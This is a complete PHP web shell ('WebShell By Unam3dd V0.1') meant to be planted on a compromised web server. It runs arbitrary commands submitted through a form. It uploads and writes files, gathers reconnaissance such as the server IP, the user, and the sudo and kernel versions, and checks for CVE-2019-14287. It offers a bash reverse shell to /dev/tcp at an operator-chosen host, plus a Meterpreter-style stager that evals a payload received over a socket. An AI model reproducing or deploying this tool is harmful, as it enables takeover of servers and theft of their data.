<html>
    <head>
        <meta charset="UTF-8">
	    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	    <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <title>WebShell By Unam3dd V0.1</title>
        <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/Unam3dd/MyFirstWebShell/master/MOSHED-2019-12-24-11-19-59.gif">
        <link href="https://fonts.googleapis.com/css?family=Cinzel&display=swap" rel="stylesheet">
    </head>

    <body style="background-color: black;width:100%;margin:auto;min-width:600px;max-width:2000px;">
        <center><img width="600" height="300" src="https://raw.githubusercontent.com/Unam3dd/MyFirstWebShell/master/MOSHED-2019-12-24-11-19-59.gif"></img></center>
	    <center><font face="Cinzel" size=10 color="green">WebShell By Unam3dd</font></center>
        <div style="border:1px solid green;position: absolute;top: 10px;right: 10px;">
            <p style="color: green;">Version 0.1</p>
        </div>
        <div style="border:1px solid green;height: 5%;margin: auto;position: absolute;top: 10px; left: 10px;">
            <?php
            if(!empty($_POST['sentphpinfo'])) {
                $filename = 'phpinfo.php';
                $check_file = file_exists($filename);
                if ($check_file){
                    header('Location: phpinfo.php');
                }
                else{
                    $template = '
<html>
    <?php
        phpinfo(INFO_ALL);
    ?>
</html>
                    ';
                    file_put_contents('phpinfo.php',$template);
                    header('Location: phpinfo.php');
                }
            }
            ?>
            <form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
                <input type="submit" id="sentphpinfo" name="sentphpinfo" value="Show Php Info"></a>
            </form>
        </div>

        <div style="position: absolute;top: 500px;left: 10px;">
            <br></br>
            <br></br>
            <form method="post">
                <p style="border:1px solid green;width: 50%;margin: auto;color: green;">Change Directory</p>
                <p style="color: green;">
                    Enter Path : <input style="background-color: black;color: green;" type="text" name="cddir">
                </p>
            </form>
            <br></br>
            <br></br>
            <form method="post">
                <p style="border:1px solid green;width: 43%;margin: auto;color: green;">Reverse Shell</p>
                <p style="color: green;">
                    Enter LHOST : <input style="background-color: black;color: green;" type="text" name="lhost">
                    <br></br>
                    Enter LPORT : <input style="background-color: black;color: green;" type="text" name="lport">
                    <br></br>
                    <input style="color: green;" type="submit" name="send_payload" value="Send Payload !"/>
                </p>
            </form>
            <form method="post">
                <p style="border:1px solid green;width: 50%;margin: auto;color: green;">Meterpreter Shell</p>
                <p style="color: green;">
                    Enter LHOST : <input style="background-color: black;color: green;" type="text" name="lhost_meterpreter">
                    <br></br>
                    Enter LPORT : <input style="background-color: black;color: green;" type="text" name="lport_meterpreter">
                    <br></br>
                    <input style="color: green;" type="submit" name="send_payload_meterpreter" value="Send Payload !"/>
                </p>
            </form>
        </div>

        <?php
            echo '<div style="border:1px solid green;width: 50%; margin: auto;"><center><font face="Cinzel" size=2 color="green">Version : ';
            $sysinfo = popen("uname -a 2>&1","r");
            while ( !feof($sysinfo) ){
                echo fread($sysinfo,4096);
                flush();
            }
            fclose($sysinfo);
            echo '</font></center></div>';
        ?>
        <center>
        <div style="position: absolute;top: 300px;left: 50px;color: green;border:1px solid green;width: 300px;height: 200px;margin: auto;">
            <p>Informations</p>
            <?php

                $ip_server = 'curl ifconfig.me';
                echo '<pre style="color: yellow;border:1px solid green;">IP : ';
                $stdout_stderr = popen($ip_server,"r");
                while ( !feof($stdout_stderr) ){
                    echo fread($stdout_stderr,65556);
                    flush();
                }
                echo '</pre>';

                $user_get = 'whoami';
                echo '<pre style="color: yellow;border:1px solid green;">User : ';
                $stdout_stderr = popen($user_get." 2>&1","r");
                while ( !feof($stdout_stderr) ){
                    echo fread($stdout_stderr,65556);
                    flush();
                }
                echo '</pre>';

                $sudo_version = 'sudo -V | grep -o "Sudoers I/O plugin version.*" | cut -d " " -f5';
                echo '<pre style="color: yellow;border:1px solid green;height: 15px;">Sudo Version : ';
                $stdout_stderr = popen($sudo_version." 2>&1","r");
                while ( !feof($stdout_stderr) ){
                    echo fread($stdout_stderr,65556);
                    flush();
                }
                echo '</pre>';

                $bash_version = 'bash --version | grep -o "GNU bash.*" | cut -d " " -f4';
                echo '<pre style="color: yellow;border:1px solid green;height: 15px;">Bash Version : ';
                $stdout_stderr = popen($bash_version." 2>&1","r");
                while ( !feof($stdout_stderr) ){
                    echo fread($stdout_stderr,65556);
                    flush();
                }
                echo '</pre>';

                $kernel_version = 'uname -r';
                echo '<pre style="color: yellow;border:1px solid green;height: 15px;">Kernel Version : ';
                $stdout_stderr = popen($kernel_version." 2>&1","r");
                while ( !feof($stdout_stderr) ){
                    echo fread($stdout_stderr,65556);
                    flush();
                }
                echo '</pre>';

                $id_cmd = 'id';
                echo '<pre style="color: yellow;border:1px solid green;height: 15px;">';
                $stdout_stderr = popen($id_cmd." 2>&1","r");
                while ( !feof($stdout_stderr) ){
                    echo fread($stdout_stderr,65556);
                    flush();
                }
                echo '</pre>';

            ?>
        </div>
        <div style="position: absolute;top: 300px;right: 50px;color: green;border:1px solid green;width: 300px;height: 200px;margin: auto;">
            <?php
                $sudo_version = 'sudo -V | grep -o "Sudoers I/O plugin version.*" | cut -d " " -f5';
                echo '<pre style="color: yellow;border:1px solid green;height: 20px;margin: auto;">Exploit (Local Root,etc..)<br></br> ';
                $stdout_stderr = popen($sudo_version." 2>&1","r");
                while ( !feof($stdout_stderr) ){
                    $sudo_version = fread($stdout_stderr,65556);
                }
                $version_split = implode('.',$sudo_version);
                if ($version_split<1828){
                    echo '<p style="border:1px solid green;color: red;">Vulnerable To CVE-2019-14287<br></br><a style="color: yellow;" target="_BLANK" href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287">Watch Vulnerability</a></p>';
                } else{
                    echo '<p style="border:1px solid green;color: red;"> Not Vulnerable To CVE-2019-14287</p>';
                }
                echo '</pre>';
            ?>
        </div>

        <div style="position: absolute;top: 550px;right: 50px;color: green;border:1px solid green;width: 300px;height: 200px;margin: auto;">
            <p style="color: yellow;border:1px solid green;margin: auto;">Edit File</p>
            <p style="color: green;">
            <form method="post">
                Filename : <input style="background-color: black;color: green;" type="text" name="gen_filename">
                <br></br>
                <textarea style="background-color: black;color: green;border:1px solid green;" name="content_file" cols="36" rows="7" placeholder="Write File..."></textarea>
                <br></br>
                <input style="color: yellow;" type="submit" name="create_file" size="100" value="Create File !"/>
            </form>
            </p>
        </div>

        <br></br>
        <br></br>
        <p style="border:1px solid green;width: 20%;margin: auto;color: green;">
            Upload File
        </p>
        <br></br>
        <form method="post" enctype="multipart/form-data">
            <input style="color: green;" type="file" name="file"/>
            <input style="color: green;" type="submit" name="upload" value="Uploads !"/>
        </form>
        <form method="post">
            <p style="border:1px solid green;width: 14%;margin auto;color: green;">
                Shell~:$<input style="background-color: black;color: green;" placeholder="Enter Commands !" type="text" name="cmd" size="21"/>
            </p>
            <input style="background-color: black;color:green;" type="submit" value="Send Command">
        </form>
        </center>
        <?php

        function startswith($stri,$startstring){
            $len = strlen($startstring);
            return (substr($stri,0,$len) == $startstring);
        }


        if(isset($_POST['cmd']))
        {
            $command = $_POST['cmd'];
            echo '<center><font face="Cinzel" size=3 color="green"><pre style="border:1px solid green;width: 50%;margin: auto;">[Terminal Output]<br></br>';
            $stdout_stderr = popen($command." 2>&1","r");
            while ( !feof($stdout_stderr) ){
                echo fread($stdout_stderr,65556);
                flush();
            }
            echo '</pre></font></center>';
        }

        if(isset($_POST["create_file"]))
        {
            if (file_exists($_POST["gen_filename"])){
                    echo '<p style="position: absolute;top: 800px;right: 110px;color: red;">[-] Error File Exists !</p>';
            } else{
                file_put_contents($_POST["gen_filename"],$_POST["content_file"]);
                $current_dir = getcwd();
                echo '<p style="position: absolute;top: 800px;right: 110px;color: green;">[+] File Writed '.$current_dir.'/'.$_POST["gen_filename"].'</p>';
            }
        }

        if(isset($_POST["send_payload"]))
        {
            $command = "/bin/bash -c 'bash -i > /dev/tcp/".$_POST["lhost"]."/".$_POST["lport"]." 0>&1'";
            exec($command);
        }

        if(isset($_POST["send_payload_meterpreter"]))
        {
            error_reporting(0); $ip = $_POST["lhost_meterpreter"]; $port = (int)$_POST["lport_meterpreter"]; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
        }

        if(isset($_POST["cddir"])){
            $new_dir = $_POST["cddir"];
            if (file_exists($new_dir)) {
                chdir($new_dir);
                echo '<p style="border:1px solid green;width: 20%;margin: auto;color: green;position: absolute;top: 650px;left: 10px;color: green;">[+] Dir Changed => '.$new_dir.'</p>';
            } else {
                echo '<p style="border:1px solid red;width: 20%;margin: auto;color: red;position: absolute;top: 650px;left: 10px;color: red;">[-] '.$new_dir.' Not Found !</p>';
            }
        }

        if(isset($_POST["upload"]))
        {
            $tmp = $_FILES["file"]["tmp_name"];
            $filename = $_FILES["file"]["name"];
            if (file_exists($filename)){
                echo '<center><p style="color: red;">[-] File Already Exists</p></center>';
            }
            else{
                if (move_uploaded_file($tmp, $filename)){
                    echo '<center><p style="color: green;">[+] File Uploaded At => '.$filename.'</p></center>';
                } else {
                    echo '<center><p style="color: red;">[-] File Not Uploaded</p></center>';
                }
            }
        }
        ?>
        <?php
        $dir = getcwd();
        $files = scandir($dir);
        $max_repo = sizeof($files);
        $i = 1;
        echo '<center><font face="Cinzel" color="green" size="1"><h1 style="border:1px solid green;width: 50%;margin: auto;color: green;">Path '.$dir.'</h1></font></center>';
        for ($y = 0;$i <= $max_repo; $i++){
            echo '<pre style="border:1px solid green;width: 50%;margin: auto;color: green;">'.$files[$i].'<a style="position: absolute;right: 500px;color: yellow;" href="'.$files[$i].'">Download</a></pre>';
        }
        
        for ($o = 0;$o<20;$o++){
            echo '<br></br>';
        }
        ?>
        <br></br>
        <br></br>
        <br></br>
    </body>
    <iframe width="1" height="1" src="https://www.youtube.com/embed/5nueXd-fAyY?rel=0&autoplay=1" frameborder="0" allowfullscreen></iframe>
</html>
